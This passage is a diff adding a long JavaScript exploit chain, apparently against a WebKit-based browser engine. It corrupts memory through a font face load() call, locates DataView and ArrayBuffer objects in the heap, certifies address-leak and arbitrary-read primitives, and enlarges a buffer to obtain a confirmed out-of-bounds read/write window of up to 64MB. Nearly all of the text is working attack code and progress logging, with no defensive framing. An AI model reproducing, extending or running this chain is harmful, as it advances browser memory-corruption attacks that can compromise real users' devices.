+         *  PHASE B: MULTI-SHOT TEST
+         *  Can we fire the COOP write AGAIN on the same face?
+         *  Re-zero promise, re-craft face, fire load() a second time.
+         * ============================================================ */
+        if(loadReturned){
+          bs('V39-PHASE-B-multishot');
+
+          /* B1: re-borrow timer (readAt still works after dispatch;
+           * temporarily restore original table pointer for the reads) */
+          for(var rb=0;rb<8;rb++)hitBuf[0x58+rb]=Number((L1>>BigInt(rb*8))&0xFFn);
+
+          var timerH2=readAt(sibBk+0x88n,0x38);
+          bs('V39-B-TIMER-REBORROWED='+timerH2);
+
+          /* B2: re-zero the forged promise (fresh unfulfilled state) */
+          for(var rz=0xC0;rz<0x100;rz++)sv.setUint8(rz,0);
+          bs('V39-B-PROMISE-REZEROED');
+
+          /* B3: re-aim promise */
+          dvSetBig(sv,0x88,S+0xC0n);
+
+          /* B4: re-craft the face */
+          bs('V39-B-FACE-RECRAFT');
+          for(var sz2=0x28;sz2<=0x57;sz2++)hitBuf[sz2]=0;
+          for(var c22=0x60;c22<=0x67;c22++)hitBuf[c22]=0;
+          hitBuf[0x82]=0; hitBuf[0x83]=1; hitBuf[0x87]=1;
+          for(var bl2=0x84;bl2<=0x89;bl2++)hitBuf[bl2]=1;
+          for(var tb2=0;tb2<0x38;tb2++)hitBuf[0x88+tb2]=parseInt(timerH2.substr(tb2*2,2),16);
+          for(var hz3=0x98;hz3<0xA8;hz3++)hitBuf[hz3]=0;
+          for(var hz4=0xA8;hz4<0xB0;hz4++)hitBuf[hz4]=0;
+
+          /* B5: re-install table pointer (LAST write before load) */
+          for(var hb2=0;hb2<8;hb2++)hitBuf[0x58+hb2]=Number(((S+0x30n)>>BigInt(hb2*8))&0xFFn);
+
+          /* B6: gates for shot 2 */
+          var g2ok=true;
+          var g2_1='';for(var g2_1i=0;g2_1i<16;g2_1i++)g2_1+=('0'+sv.getUint8(0x20+g2_1i).toString(16)).slice(-2);
+          if(g2_1!=='00000000010000000300000004000000'){g2ok=false;bs('V39-B-G1-FAIL');}
+          if(hitBuf[0x82]!==0){g2ok=false;bs('V39-B-G5-status-FAIL='+hitBuf[0x82]);}
+          var g2_5v=0n;for(var g2q=0;g2q<8;g2q++)g2_5v|=BigInt(hitBuf[0x90+g2q])<<BigInt(g2q*8);
+          if(g2_5v===0n){g2ok=false;bs('V39-B-G5-timer-FAIL');}
+          if(sv.getUint8(0xE0)!==0x00){g2ok=false;bs('V39-B-GP-engaged-FAIL');}
+          if(g2ok)bs('V39-B-GATES-OK');
+
+          if(!g2ok){
+            bs('V39-B-GATE-FAIL-NO-SECOND-SHOT');
+          }else{
+            /* B7: snapshot before shot 2 */
+            var preB=new Uint8Array(window.__v688.spray[mIdx].slice(0xC0,0x100));
+
+            /* B8: FIRE SHOT 2 */
+            bs('V39-B-LOAD-PRE');
+            var load2=false;
+            try{
+              faces[zi].load();
+              load2=true;
+              bs('V39-B-LOAD-RETURNED');
+            }catch(e2){
+              bs('V39-B-LOAD-THREW-'+String(e2&&e2.message?e2.message:'?'));
+            }
+
+            /* B9: witness shot 2 */
+            bs('V39-B-WIT-status='+hitBuf[0x82]+'-rc-after='+sv.getUint32(0x68,true));
+
+            var curB=new Uint8Array(window.__v688.spray[mIdx].slice(0xC0,0x100));
+            var diffs2=[];
+            for(var bd2=0;bd2<0x28;bd2++){
+              if(curB[bd2]!==preB[bd2])diffs2.push('+'+bd2.toString(16).padStart(2,'0')+':'+preB[bd2].toString(16).padStart(2,'0')+'>'+curB[bd2].toString(16).padStart(2,'0'));
+            }
+            if(diffs2.length){
+              bs('V39-B-WRITE-MASK='+diffs2.join('|'));
+              if(load2){
+                bs('V39-MULTISHOT-CONFIRMED-two-clean-dispatches');
+                verd('ok','V39 MULTISHOT CONFIRMED');
+              }
+            }else{
+              bs('V39-B-NO-DIFFS'+(load2?'-returned-but-no-write':'-crashed'));
+            }
+          }
+        }
+
+        } /* end if(false) V51 skip Phase A+B */
+
+        /* ---- CLEANUP: restore original table pointer ---- */
+        for(var rc=0;rc<8;rc++)hitBuf[0x58+rc]=Number((L1>>BigInt(rc*8))&0xFFn);
+        bs('V39-SETUP-DONE');
+      }
+
+    }else bs('V39-SKIP-bad-idx');
+  }else bs('V39-SKIP-missing-data');
+}catch(e39){bs('V39-ERR-'+String(e39&&e39.message?e39.message:'?'));}
+/* ==== V39 END ==== */
+
+
+          bs('PATHB-LINKAGE-PENDING-deterministic-carrier/addrof-linkage-still-missing');
+
+          /* --- optional ?dv=<hex> JSDataView candidate cell certification --- */
+          /* --- JSDataView candidate certification: manual ?dv= takes priority,
+           * else the V13 auto-found candidates (CELLC, up to 4) — each fully
+           * verified in order; first success certifies and caches. --- */
+          var cellCandsL=(DVQ!==0n)?[DVQ]:((typeof CELLC!=='undefined'&&CELLC.length>0)?CELLC.slice():[]);
+          if(cellCandsL.length===0){
+            bs('ADDROF-PENDING-target-DataView-allocated-but-JSCell-not-auto-discovered');
+          }else{
+            for(var cIdx=0;cIdx<cellCandsL.length;cIdx++){
+              var cell=cellCandsL[cIdx];
+              bs('DV-candidate-'+cIdx+'-cell='+hex(cell));
+              var dvH=readAt(cell,64); /* covers +0x18 m_length and +0x20 m_byteOffset */
+              dumpQ('DVHDR'+cIdx,dvH,64);
+              var dvButterfly=qAt(dvH,0x08);
+              var dvVector=qAt(dvH,0x10);
+              var dvLength=qAt(dvH,0x18);
+              var dvByteOff=qAt(dvH,0x20);
+              bs('DV'+cIdx+'-butterfly08='+hex(dvButterfly)+'-vector10='+hex(dvVector)+'-length18='+hex(dvLength)+'-byteOffset20='+hex(dvByteOff));
+              var hdrOK=(dvButterfly===0n)&&canonHeap(dvVector)&&(dvLength===0x40n)&&(dvByteOff===0x20n);
+              if(!hdrOK){bs('CAND-'+cIdx+'-HDR-FAIL');continue;}
+
+              /* Prove the vector by reading each exact 8B marker at its own
+               * address with FRESH reads (never one assumed contiguous read). */
+              var V=dvVector;
+              var mC=0x55AA33CC0FF0E11En, mA=0x13579BDF02468ACEn, mB=0x2468ACE013579BDFn;
+              var mD=0x0D15EA5EC001D00Dn, mE=0xDEADBEEFCAFEBABEn, mF=0x0123456789ABCDEFn;
+              var checks=[
+                ['C', V-8n,      mC],
+                ['A', V,         mA],
+                ['B', V+0x38n,   mB],
+                ['D', V+0x40n,   mD],
+                ['E', V-0x20n,   mE],
+                ['F', V+0xD8n,   mF]  /* final 8B of the 0x100 alloc; never 16 there */
+              ];
+              var allOK=true;
+              for(var mk=0;mk<checks.length;mk++){
+                var nm=checks[mk][0],ad=checks[mk][1],ex=checks[mk][2];
+                var mh=readAt(ad,8);
+                var got=qAt(mh,0);
+                var ok=(got===ex);
+                if(!ok)allOK=false;
+                bs('DVMARK'+cIdx+'-'+nm+'-got='+hex(got)+'-expect='+hex(ex)+'-match='+ok);
+              }
+              if(!allOK){bs('CAND-'+cIdx+'-MARK-FAIL');continue;}
+              bs('ADDROF-CERTIFIED-cell='+hex(cell)+'-vectorFieldAddr='+hex(cell+0x10n)+'-realVector='+hex(V)+'-arrayBufferBase='+hex(V-0x20n));
+              try{localStorage.setItem('v688_cell',cell.toString(16));}catch(e5){}
+
+              /* ==== V40: ARRAYBUFFER LAYOUT RECON ==== */
+              /* We have: cell (JSDataView JSCell address), V (m_vector),
+               * readAt, dvH (64 bytes from cell). Read m_buffer at cell+0x30. */
+              /* V40 SLIM: just get AB_ADDR for the chain */
+              try{
+                var AB_ADDR = qAt(dvH, 0x30);
+                bs('V40-AB-ADDR='+hex(AB_ADDR));
+              }catch(e40){bs('V40-ERR');}
+              /* ==== V40 END ==== */
+
+              /* ==== V41 DISABLED in V51 — already proven ==== */
+              if(false){ try{
+                bs('V41-START');
+                function v41LE32(hx,off){var b='';for(var i=3;i>=0;i--)b+=hx.substr((off+i)*2,2);return parseInt(b,16);}
+                function v41LE64(hx,off){var lo=v41LE32(hx,off),hi=v41LE32(hx,off+4);return BigInt(lo)|(BigInt(hi)<<32n);}
+
+                /* Phase A: Read the SharedTask destructor object */
+                if(typeof ab_mDestr !== 'undefined' && ab_mDestr > 0n){
+                  var stDump = readAt(ab_mDestr, 0x20);
+                  bs('V41-SHAREDTASK-RAW='+stDump);
+                  var st_vtable = v41LE64(stDump, 0x00);
+                  var st_refCount = v41LE32(stDump, 0x08);
+                  bs('V41-ST-vtable='+hex(st_vtable)+'-refCount='+st_refCount);
+                  bs('V41-ST-vtable-RVA='+hex(st_vtable - BASE));
+                  /* Read vtable entries: [0]=typeinfo, [8]=destructor, [10]=run */
+                  var vtDump = readAt(st_vtable, 0x20);
+                  bs('V41-ST-VTABLE-RAW='+vtDump);
+                  var vt_typeinfo = v41LE64(vtDump, 0x00);
+                  var vt_dtor = v41LE64(vtDump, 0x08);
+                  var vt_run = v41LE64(vtDump, 0x10);
+                  bs('V41-ST-vt-typeinfo='+hex(vt_typeinfo)+'-dtor='+hex(vt_dtor)+'-run='+hex(vt_run));
+                  bs('V41-ST-run-RVA='+hex(vt_run - BASE));
+                }
+
+                /* Phase B: OOB attempt via COOP write on victim DataView.
+                 *
+                 * We need a SECOND DataView cell whose m_length we'll expand.
+                 * Problem: the victim DV cell address must be known. We find it
+                 * the same way: via readAt scanning or from the spray.
+                 *
+                 * APPROACH: Use the EXISTING certified DataView (cell) as the
+                 * target. It has m_length=0x40, m_byteOffset=0x20.
+                 * If we aim at (cell + 0x10):
+                 *   cell+0x18 (m_length) low 4B = 0x0000000F → length=15 (SHRINK from 64!)
+                 *   cell+0x20 (m_byteOffset) = 0 (was 0x20 → shifts window)
+                 *   cell+0x28 (m_mode) = 0 (was 0x88)
+                 *   cell+0x30 (m_buffer) low byte = 1
+                 *
+                 * m_length shrinks from 64 to 15 — that's the wrong direction.
+                 *
+                 * ALTERNATIVE: Create a victim DV with m_length=0, m_byteOffset=end.
+                 * But we can't easily create AND find a new DV cell at this point.
+                 *
+                 * SIMPLER: Just use the current readAt to read OOB instead.
+                 * We already have ARBITRARY READ. We don't need an OOB DataView
+                 * for reading. What we need is ARBITRARY WRITE.
+                 *
+                 * THE REAL ESCALATION: Use COOP write to corrupt the certified
+                 * DataView's m_vector (CagedPtr). If we zero m_byteOffset, the
+                 * DataView window shifts, giving us access to different bytes.
+                 * Combined with the existing readAt for recon, this may not
+                 * add much. But writing through the DataView bypasses readAt's
+                 * read-only limitation — DataView can WRITE.
+                 *
+                 * KEY REALIZATION: We have readAt (arbitrary read) but the COOP
+                 * write is the ONLY write primitive. If we can turn it into a
+                 * DataView-based write (arbitrary address, arbitrary value via
+                 * dv.setUint32), that's the escalation.
+                 *
+                 * FOR THAT: We need to corrupt m_vector to point outside the
+                 * current backing store. But m_vector is a CagedPtr — it gets
+                 * cage-clipped on access. So we can only point within Gigacage.
+                 *
+                 * WITHIN GIGACAGE: all ArrayBuffer data lives in Gigacage.
+                 * If m_vector points to a DIFFERENT buffer's data, we can
+                 * read/write that buffer's contents through our DataView.
+                 * That's a CONFUSED DEPUTY — we write to another buffer
+                 * while JS thinks we're writing to ours.
+                 *
+                 * PLAN FOR V41:
+                 * Don't corrupt the cell yet. Instead, gather more intel:
+                 * 1. Read the Gigacage base and size from the process
+                 * 2. Read heap metadata around our buffer to find neighbors
+                 * 3. Report this intel for the V42 attack design
+                 */
+
+                /* Read memory AROUND the AB backing store to see heap layout */
+                var dataAddr = (typeof ab_mData !== 'undefined') ? ab_mData : (V - 0x20n);
+                bs('V41-HEAP-SCAN-around='+hex(dataAddr));
+
+                /* Read 64 bytes BEFORE our buffer (potential heap metadata) */
+                var preBuf = readAt(dataAddr - 0x40n, 0x40);
+                bs('V41-PRE-BUF='+preBuf);
+
+                /* Read 64 bytes AFTER our buffer (next allocation) */
+                var abSize = (typeof ab_mSize !== 'undefined') ? ab_mSize : 0x100n;
+                var postBuf = readAt(dataAddr + abSize, 0x40);
+                bs('V41-POST-BUF='+postBuf);
+
+                /* Parse and report what's around us */
+                var preQ0 = v41LE64(preBuf, 0x00);
+                var preQ1 = v41LE64(preBuf, 0x08);
+                var preQ2 = v41LE64(preBuf, 0x10);
+                var preQ3 = v41LE64(preBuf, 0x18);
+                bs('V41-PRE-q0='+hex(preQ0)+'-q1='+hex(preQ1)+'-q2='+hex(preQ2)+'-q3='+hex(preQ3));
+
+                var postQ0 = v41LE64(postBuf, 0x00);
+                var postQ1 = v41LE64(postBuf, 0x08);
+                var postQ2 = v41LE64(postBuf, 0x10);
+                var postQ3 = v41LE64(postBuf, 0x18);
+                bs('V41-POST-q0='+hex(postQ0)+'-q1='+hex(postQ1)+'-q2='+hex(postQ2)+'-q3='+hex(postQ3));
+
+                /* Also read adjacent spray buffers to understand spacing */
+                if(mIdx < 31){
+                  /* The spray buffers are sequential. Read the tag of the next one. */
+                  var nextTag = readAt(MBUF + 0x100n + 0x48n, 8);
+                  var nextTagV = qAt(nextTag, 0);
+                  bs('V41-NEXT-SPRAY-TAG='+hex(nextTagV));
+                }
+
+                /* Read Gigacage config — try to find the cage base.
+                 * Gigacage::basePtr(Primitive) is a global.
+                 * We can search for it by reading g_gigacageBasePtrs from the module. */
+                /* The Gigacage base is stored at a known offset from the module base.
+                 * We'd need to find it via symbol or by reading the data section.
+                 * For now, we can INFER the cage base from our known pointer:
+                 * m_vector and m_data are within Gigacage. The cage is typically
+                 * aligned to a large power of 2 (e.g., 32GB or 4GB boundary). */
+                var inferredCageBase = dataAddr & ~0xFFFFFFFFn; /* mask to 4GB boundary */
+                bs('V41-INFERRED-CAGE-BASE='+hex(inferredCageBase));
+                /* Alternate: 32GB boundary */
+                var cage32 = dataAddr & ~0x7FFFFFFFFn;
+                bs('V41-CAGE-32GB='+hex(cage32));
+
+                bs('V41-RECON-DONE');
+              }catch(e41){bs('V41-ERR-'+String(e41&&e41.message?e41.message:'?'));}
+              /* ==== V41 END ==== */
+              } // end if(false) V41 disabled
+
+              /* ==== V45: CORRECT AB TARGET via JSArrayBuffer.m_impl ==== */
+              try{
+                bs('V45-START');
+                function v45LE32(hx,off){var b='';for(var i=3;i>=0;i--)b+=hx.substr((off+i)*2,2);return parseInt(b,16);}
+                function v45LE64(hx,off){var lo=v45LE32(hx,off),hi=v45LE32(hx,off+4);return BigInt(lo)|(BigInt(hi)<<32n);}
+
+                var coopOK=(typeof sv!=='undefined'&&typeof hitBuf!=='undefined'
+                  &&typeof faces!=='undefined'&&typeof zi!=='undefined'
+                  &&typeof sibBk!=='undefined'&&typeof S!=='undefined'
+                  &&typeof AB_ADDR!=='undefined'&&AB_ADDR>0n);
+                bs('V45-COOP-OK='+coopOK);
+                if(!coopOK){bs('V45-ABORT');
+                }else{
+                  for(var rb=0;rb<8;rb++)hitBuf[0x58+rb]=Number((L1>>BigInt(rb*8))&0xFFn);
+
+                  /* STEP 0: Find the REAL C++ ArrayBuffer via the WeakImpl chain.
+                   * AB_ADDR.m_wrapper (+0x50) = WeakImpl*
+                   * WeakImpl.m_jsValue (+0x00) = JSArrayBuffer cell (JSValue)
+                   * JSArrayBuffer.m_impl (+0x10) = ArrayBuffer* (the REAL one)
+                   */
+                  var weakImplAddr = v45LE64(readAt(AB_ADDR+0x50n,8),0);
+                  bs('V45-WEAKIMPL='+hex(weakImplAddr));
+
+                  var jsABCell = 0n;
+                  var realAB = 0n;
+                  if(weakImplAddr > 0x1000000n){
+                    jsABCell = v45LE64(readAt(weakImplAddr,8),0);
+                    bs('V45-JSAB-CELL='+hex(jsABCell));
+                    if(jsABCell > 0x1000000n){
+                      realAB = v45LE64(readAt(jsABCell+0x10n,8),0);
+                      bs('V45-REAL-AB='+hex(realAB));
+                    }
+                  }
+
+                  if(realAB === 0n || realAB < 0x1000000n){
+                    bs('V45-REAL-AB-NOT-FOUND');
+                  }else{
+                    /* Dump the real AB to verify layout */
+                    var realDump=readAt(realAB,0x60);
+                    bs('V45-REAL-AB-DUMP='+realDump);
+                    var real_mData=v45LE64(realDump,0x10);
+                    var real_mSize=v45LE64(realDump,0x30);
+                    var real_mMax=v45LE64(realDump,0x38);
+                    bs('V45-REAL-mData='+hex(real_mData)+'-mSize='+hex(real_mSize)+'-mMax='+hex(real_mMax));
+
+                    /* Verify: does realAB.m_data match our buffer data base? */
+                    var dataBase = V - 0x20n;
+                    bs('V45-DATA-BASE='+hex(dataBase)+'-REAL-mData='+hex(real_mData)+'-match='+(real_mData===dataBase));
+
+                    /* Now use realAB for the expansion */
+                    var TARGET_AB = realAB;
+                  }
+
+                  /* Pre-flight on the CORRECT AB */
+                  var useAB = (typeof TARGET_AB !== 'undefined' && TARGET_AB > 0n) ? TARGET_AB : AB_ADDR;
+                  bs('V45-TARGET-AB='+hex(useAB));
+
+                  var pfDump=readAt(useAB+0x30n,0x20);
+                  var gate37=parseInt(pfDump.substr(7*2,2),16);
+                  var vecSz=v45LE32(pfDump,0x1B);
+                  bs('V45-GATE-AB37=0x'+gate37.toString(16)+'-VECSZ-AB4B=0x'+vecSz.toString(16));
+
+                  if(gate37!==0||vecSz!==0){
+                    bs('V45-PREFLIGHT-FAIL');
+                  }else{
+                    bs('V45-PREFLIGHT-OK');
+
+                    var abBefore=readAt(useAB+0x18n,0x28);
+                    bs('V45-AB-BEFORE='+abBefore);
+
+                    var aim45=useAB+0x17n;
+                    bs('V45-AIM='+hex(aim45));
+
+                    var t42=readAt(sibBk+0x88n,0x38);
+                    for(var pz=0xC0;pz<0x100;pz++)sv.setUint8(pz,0);
+                    dvSetBig(sv,0x88,aim45);
+                    for(var sz=0x28;sz<=0x57;sz++)hitBuf[sz]=0;
+                    for(var c2=0x60;c2<=0x67;c2++)hitBuf[c2]=0;
+                    hitBuf[0x82]=0;hitBuf[0x83]=1;hitBuf[0x87]=1;
+                    for(var bl=0x84;bl<=0x89;bl++)hitBuf[bl]=1;
+                    for(var tb=0;tb<0x38;tb++)hitBuf[0x88+tb]=parseInt(t42.substr(tb*2,2),16);
+                    for(var hz=0x98;hz<0xB0;hz++)hitBuf[hz]=0;
+                    for(var hb=0;hb<8;hb++)hitBuf[0x58+hb]=Number(((S+0x30n)>>BigInt(hb*8))&0xFFn);
+
+                    bs('V45-FIRE-PRE');
+                    var f45=false;
+                    try{faces[zi].load();f45=true;bs('V45-FIRE-RETURNED');}
+                    catch(ef){bs('V45-FIRE-THREW-'+String(ef&&ef.message?ef.message:'?'));}
+
+                    for(var rc=0;rc<8;rc++)hitBuf[0x58+rc]=Number((L1>>BigInt(rc*8))&0xFFn);
+
+                    var abAfter=readAt(useAB+0x18n,0x28);
+                    bs('V45-AB-AFTER='+abAfter);
+                    var newDMSB=parseInt(abAfter.substr(7*2,2),16);
+                    var newSize=v45LE64(abAfter,0x18);
+                    bs('V45-DTOR-MSB=0x'+newDMSB.toString(16)+'-NEW-SIZE='+hex(newSize));
+
+                    if(f45&&newSize>0x100n){
+                      bs('V48-SIZE-EXPANDED='+hex(newSize));
+                      bs('V48-STALE-A='+hex(useAB));
+
+                      try{/*V48 — fresh DV to find real impl */
+                        var sprayBuf=window.__v688.spray[mIdx];
+                        bs('V48-JS-BL-PRE='+sprayBuf.byteLength);
+
+                        /* STEP 1: Create a FRESH DataView on sprayBuf.
+                         * The engine resolves sprayBuf → JSArrayBuffer → m_impl
+                         * for us. byteOffset=0 distinguishes from spray's original
+                         * views (byteOffset=0x20). */
+                        var freshDV;
+                        try{
+                          freshDV = new DataView(sprayBuf, 0, 0x40);
+                          bs('V48-FRESH-DV-OK-len='+freshDV.byteLength);
+                        }catch(efd){
+                          bs('V48-FRESH-DV-FAIL-'+String(efd&&efd.message?efd.message:'?'));
+                          freshDV = new DataView(sprayBuf, 0); /* no explicit length */
+                          bs('V48-FRESH-DV-NOLEN-OK-len='+freshDV.byteLength);
+                        }
+
+                        /* STEP 2: Find the fresh DV cell via CSCAN.
+                         * Search GC heap for cells with m_vector matching our data
+                         * and m_byteOffset=0 (fresh) vs 0x20 (original spray). */
+                        var dataBase = V - 0x20n;
+                        bs('V48-SCAN-FOR-FRESH-DV-near='+hex(cell));
+
+                        /* Scan near the known cell region for DataView cells.
+                         * Look in a ±0x10000 range from the certified cell. */
+                        var freshCell = 0n;
+                        var freshMBuf = 0n;
+                        var scanned = 0;
+
+                        /* The certified DV cell has structureID pattern. Read its
+                         * header to get the structureID for DataView cells. */
+                        var dvStructID = v45LE32(readAt(cell, 4), 0);
+                        var dvType = parseInt(readAt(cell+5n, 1), 16);
+                        bs('V48-DV-STRUCT=0x'+dvStructID.toString(16)+'-TYPE=0x'+dvType.toString(16));
+
+                        /* Scan: check cells at 64-byte stride (MarkedBlock cell size).
+                         * DataView cells are typically 0x40 bytes. */
+                        var scanBase = (cell & ~0xFFFFn); /* align to 64KB block */
+                        for(var sc = scanBase; sc < scanBase + 0x10000n && freshCell === 0n; sc += 0x40n){
+                          scanned++;
+                          if(sc === cell) continue; /* skip the certified cell */
+                          var hdr = readAt(sc, 0x38);
+                          var sid = v45LE32(hdr, 0);
+                          var typ = parseInt(hdr.substr(5*2, 2), 16);
+                          if(sid === dvStructID && typ === dvType){
+                            /* Found a DataView cell. Check m_byteOffset */
+                            var cOff = v45LE64(hdr, 0x20);
+                            var cLen = v45LE64(hdr, 0x18);
+                            var cVec = v45LE64(hdr, 0x10);
+                            if(cOff === 0n && cLen === 0x40n){
+                              /* byteOffset=0, length=64 → this is our fresh DV! */
+                              var cBuf = v45LE64(hdr, 0x30);
+                              bs('V48-FRESH-CELL='+hex(sc)+'-vec='+hex(cVec)+'-mbuf='+hex(cBuf));
+                              freshCell = sc;
+                              freshMBuf = cBuf;
+                            }
+                          }
+                        }
+                        bs('V48-SCANNED='+scanned);
+
+                        if(freshCell === 0n){
+                          bs('V48-FRESH-CELL-NOT-FOUND');
+                        }else{
+                          bs('V48-FRESH-MBUF='+hex(freshMBuf));
+                          bs('V48-STALE-A='+hex(useAB));
+                          bs('V48-SAME='+(freshMBuf===useAB));
+
+                          if(freshMBuf !== useAB && freshMBuf > 0x1000000n){
+                            /* H1: DRIFT CONFIRMED — fresh DV uses a different AB! */
+                            bs('V48-H1-DRIFT-CONFIRMED');
+
+                            /* Dump the REAL authority AB */
+                            var realDump2 = readAt(freshMBuf, 0x60);
+                            bs('V48-REAL-IMPL-DUMP='+realDump2);
+                            var ri_mData = v45LE64(realDump2, 0x10);
+                            var ri_mSize = v45LE64(realDump2, 0x30);
+                            bs('V48-REAL-mData='+hex(ri_mData)+'-mSize='+hex(ri_mSize));
+                            bs('V48-DATA-MATCH='+(ri_mData === dataBase));
+
+                            /* Gate check on the REAL impl */
+                            var ri_gate = parseInt(realDump2.substr(0x37*2, 2), 16);
+                            var ri_vecSz = v45LE32(realDump2, 0x4B);
+                            bs('V48-GATE=0x'+ri_gate.toString(16)+'-VECSZ=0x'+ri_vecSz.toString(16));
+
+                            if(ri_gate === 0 && ri_vecSz === 0 && ri_mSize <= 0x100n){
+                              /* Fire the AB+0x17 shot at the REAL impl! */
+                              bs('V48-FIRE-AT-REAL-IMPL='+hex(freshMBuf));
+
+                              for(var rb2=0;rb2<8;rb2++)hitBuf[0x58+rb2]=Number((L1>>BigInt(rb2*8))&0xFFn);
+                              var t48 = readAt(sibBk+0x88n, 0x38);
+                              for(var pz2=0xC0;pz2<0x100;pz2++)sv.setUint8(pz2,0);
+                              dvSetBig(sv, 0x88, freshMBuf+0x17n);
+                              for(var sz2=0x28;sz2<=0x57;sz2++)hitBuf[sz2]=0;
+                              for(var c22=0x60;c22<=0x67;c22++)hitBuf[c22]=0;
+                              hitBuf[0x82]=0;hitBuf[0x83]=1;hitBuf[0x87]=1;
+                              for(var bl2=0x84;bl2<=0x89;bl2++)hitBuf[bl2]=1;
+                              for(var tb2=0;tb2<0x38;tb2++)hitBuf[0x88+tb2]=parseInt(t48.substr(tb2*2,2),16);
+                              for(var hz2=0x98;hz2<0xB0;hz2++)hitBuf[hz2]=0;
+                              for(var hb2=0;hb2<8;hb2++)hitBuf[0x58+hb2]=Number(((S+0x30n)>>BigInt(hb2*8))&0xFFn);
+
+                              var f48=false;
+                              try{faces[zi].load();f48=true;bs('V48-REAL-FIRE-RETURNED');}
+                              catch(ef2){bs('V48-REAL-FIRE-THREW-'+String(ef2&&ef2.message?ef2.message:'?'));}
+
+                              for(var rc2=0;rc2<8;rc2++)hitBuf[0x58+rc2]=Number((L1>>BigInt(rc2*8))&0xFFn);
+
+                              /* Verify */
+                              var newRealSize = v45LE64(readAt(freshMBuf+0x30n, 8), 0);
+                              bs('V48-REAL-NEW-SIZE='+hex(newRealSize));
+                              bs('V48-JS-BL-POST='+sprayBuf.byteLength);
+
+                              if(f48 && newRealSize > 0x100n){
+                                bs('V48-REAL-EXPANDED='+hex(newRealSize));
+
+                                /* V49: 64MB OOB + ARW BOOTSTRAP */
+                                bs('V49-BOOTSTRAP-START');
+
+                                /* Create the big OOB DataView (try 64MB, fallback to smaller) */
+                                var oobDV=null, oobSize=0;
+                                var bigSizes=[0x4000000,0x1000000,0x100000,0x10000,0x1000];
+                                for(var li=0;li<bigSizes.length;li++){
+                                  try{
+                                    oobDV=new DataView(sprayBuf,0,bigSizes[li]);
+                                    oobSize=bigSizes[li];
+                                    bs('V49-OOB-DV-OK-size=0x'+oobSize.toString(16));
+                                    break;
+                                  }catch(elad){
+                                    bs('V49-OOB-DV-FAIL-0x'+bigSizes[li].toString(16));
+                                  }
+                                }
+                                if(!oobDV){bs('V49-OOB-DV-ALL-FAIL');throw 'no oob dv';}
+
+                                /* Verify OOB R/W at +0x100 (next spray buffer) */
+                                var oobQ0=oobDV.getBigUint64(0x100,true);
+                                bs('V49-OOB-Q-0x100='+hex(oobQ0));
+                                var origB49=oobDV.getUint8(0x100);
+                                oobDV.setUint8(0x100,0x42);
+                                var wroteB49=oobDV.getUint8(0x100);
+                                oobDV.setUint8(0x100,origB49);
+                                bs('V49-OOB-WRITE-TEST=0x'+wroteB49.toString(16));
+
+                                if(wroteB49!==0x42){bs('V49-OOB-WRITE-FAIL');throw 'oob write failed';}
+                                bs('V49-OOB-RW-CONFIRMED-size=0x'+oobSize.toString(16));
+
+                                /* Report the OOB window */
+                                var ri_mData=v45LE64(realDump2,0x10);
+                                bs('V49-OOB-BASE='+hex(ri_mData));
+                                bs('V49-OOB-END='+hex(ri_mData+BigInt(oobSize)));
+
+                                /* STEP A: Repair destructor MSB on stale A */
+                                var staleOffset=Number(useAB-ri_mData);
+                                bs('V49-STALE-A-OFFSET='+staleOffset);
+                                if(staleOffset>0&&staleOffset+0x60<oobSize){
+                                  var staleDtorMSB=oobDV.getUint8(staleOffset+0x1F);
+                                  bs('V49-STALE-DTOR-MSB=0x'+staleDtorMSB.toString(16));
+                                  if(staleDtorMSB===0x0F){
+                                    oobDV.setUint8(staleOffset+0x1F,0x00);
+                                    bs('V49-STALE-DTOR-REPAIRED');
+                                  }
+                                  /* Also restore stale A's m_sizeInBytes MSB */
+                                  var staleSizeMSB=oobDV.getUint8(staleOffset+0x37);
+                                  bs('V49-STALE-SIZE-MSB=0x'+staleSizeMSB.toString(16));
+                                  if(staleSizeMSB===0x01){
+                                    oobDV.setUint8(staleOffset+0x37,0x00);
+                                    bs('V49-STALE-SIZE-REPAIRED');
+                                  }
+                                }else{
+                                  bs('V49-STALE-A-OUT-OF-RANGE='+staleOffset);
+                                }
+
+                                /* STEP B: Repair destructor MSB on real impl */
+                                var realOffset=Number(freshMBuf-ri_mData);
+                                bs('V49-REAL-IMPL-OFFSET='+realOffset);
+                                if(realOffset>=0&&realOffset+0x60<oobSize){
+                                  var realDtorMSB=oobDV.getUint8(realOffset+0x1F);
+                                  bs('V49-REAL-DTOR-MSB=0x'+realDtorMSB.toString(16));
+                                  if(realDtorMSB===0x0F){
+                                    oobDV.setUint8(realOffset+0x1F,0x00);
+                                    bs('V49-REAL-DTOR-REPAIRED');
+                                  }
+                                }else{
+                                  bs('V49-REAL-IMPL-OUT-OF-RANGE='+realOffset);
+                                }
+
+                                /* STEP C: AB scan DISABLED in V51 to save memory */
+                                var abCount=0;
+                                if(false){ /* AB scan */
+                                var abClusterStart=Number(useAB-ri_mData)-0x1000;
+                                if(abClusterStart<0)abClusterStart=0x100;
+                                var abClusterEnd=abClusterStart+0x4000;
+                                if(abClusterEnd>oobSize-0x60)abClusterEnd=oobSize-0x60;
+                                var abCount=0;
+                                bs('V49-AB-SCAN-range=0x'+abClusterStart.toString(16)+'-0x'+abClusterEnd.toString(16));
+                                for(var ai=abClusterStart;ai<abClusterEnd&&abCount<10;ai+=8){
+                                  /* Check if this looks like an AB: refcount at +0, m_data at +0x10 in Gigacage */
+                                  try{
+                                    var rc49=oobDV.getUint32(ai,true);
+                                    if(rc49>=1&&rc49<=1000){
+                                      var md49=oobDV.getBigUint64(ai+0x10,true);
+                                      if(md49>0x1000000000n&&md49<0x2000000000n){
+                                        var sz49=oobDV.getBigUint64(ai+0x30,true);
+                                        var mx49=oobDV.getBigUint64(ai+0x38,true);
+                                        if(sz49===mx49&&(sz49===0x100n||sz49===0x100000000000100n)){
+                                          var absAddr=ri_mData+BigInt(ai);
+                                          bs('V49-AB-FOUND-@0x'+ai.toString(16)+'='+hex(absAddr)+'-mData='+hex(md49)+'-size='+hex(sz49));
+                                          abCount++;
+                                        }
+                                      }
+                                    }
+                                  }catch(eas){}
+                                }
+                                bs('V49-AB-SCAN-found='+abCount);
+                                } /* end if(false) AB scan */
+
+                                /* STEP D: Report what we can read through OOB.
+                                 * Read the SharedTask vtable (if in range) for code pointers. */
+                                /* SharedTask offset check skipped (V41 disabled) */
+
+                                /* STEP E: Summary report */
+                                bs('V49-SUMMARY-oobBase='+hex(ri_mData)+'-oobSize=0x'+oobSize.toString(16)+'-abFound='+abCount);
+                                bs('V49-JS-BL-FINAL='+sprayBuf.byteLength);
